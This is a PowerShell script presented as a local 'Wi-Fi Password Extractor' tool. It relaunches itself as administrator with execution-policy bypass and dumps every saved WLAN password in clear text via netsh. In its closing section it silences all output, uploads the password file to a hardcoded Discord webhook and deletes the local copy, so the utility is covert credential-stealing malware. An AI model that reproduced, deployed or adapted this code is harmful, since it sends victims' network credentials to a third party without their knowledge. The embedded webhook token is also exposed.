# ---------- ASCII banner ----------
$banner = @"
===========================================
   WIFI PASSWORD EXTRACTOR - SQD5 TOOL
===========================================
"@

Write-Host $banner -ForegroundColor Cyan

# ---------- small animated spinner ----------
function Show-Spinner {
    param(
        [int]$Seconds = 2,
        [string]$Message = "Preparing script..."
    )
    $frames = @('/','-','\','|')
    $end = (Get-Date).AddSeconds($Seconds)
    $i = 0
    while ((Get-Date) -lt $end) {
        $frame = $frames[$i % $frames.Count]
        Write-Host -NoNewline ("`r{0} {1}" -f $frame, $Message)
        Start-Sleep -Milliseconds 150
        $i++
    }
    Write-Host "`r$Message`r"  # clear spinner line (leave the message)
}
Show-Spinner -Seconds 2 -Message "Preparing script..."

# ---------- admin check and self-elevate ----------
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Host "Not running as admin. Relaunching elevated..."
    Start-Process -FilePath powershell -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File","`"$PSCommandPath`"" -Verb RunAs
    exit 1
}

# ---------- output file and logger ----------
$outFile = Join-Path $env:USERPROFILE "Downloads\wlan_passwords.txt"

function Write-Log {
    param([string]$Text)
    Write-Host $Text
    $timeStamped = ("[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Text)
    $timeStamped | Out-File -FilePath $outFile -Append -Encoding UTF8
}

Try {
    "=============================`nWi-Fi Password Extractor`n=============================`n" | Out-File -FilePath $outFile -Encoding UTF8 -Force
} Catch {
    Write-Host "Cannot write to $outFile. Check permissions."
    exit 1
}

# ---------- gather profiles ----------

Try {
    $profiles = netsh wlan show profiles 2>$null |
        Select-String "All User Profile" |
        ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique
} Catch {
    $profiles = @()
}

if (-not $profiles) {
    Write-Log "No WLAN profiles found."
    "`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md  `n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
    exit 0
}

# ---------- process profiles ----------
foreach ($p in $profiles) {

    Try {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
    } Catch {
        $info = $null
    }

    $ssidLine = "SSID: $p"
    $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
        $_.ToString().Split(':',2)[1].Trim()
    }) -join ''

    if (-not $keyLine) {
        $keyLine = "<No password saved or open network>"
    }

    # Write in clean format without timestamp
    "SSID: $p`nPASS: $keyLine`n===" | Out-File -FilePath $outFile -Append -Encoding UTF8
}

# clear progress
Write-Progress -Activity "Extracting WLAN profiles" -Completed
-
$footer = @"
`n============================= 
Done. Results saved to: $outFile
Visit README for more info:
https://github.com/09sychic/sqd5/blob/main/README.md  
=============================
"@

$footer | Out-File -FilePath $outFile -Append -Encoding UTF8
Write-Host $footer

# ─────────────────────────────
# 🚫 SUPPRESS ALL OUTPUT (for Discord send part)
# ─────────────────────────────
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'


$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"

if (Test-Path $outFile) {
    $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
    
    $TempFile = "$env:TEMP\wlan_clean_$(Get-Date -Format 'yyMMddHHmmssffff').txt"
    $FilteredLines | Set-Content -Path $TempFile -Encoding UTF8

    try {
       
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Form @{ file = Get-Item $TempFile } | Out-Null
        Remove-Item $outFile -Force
    } catch {
    } finally {
        Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
    }
}
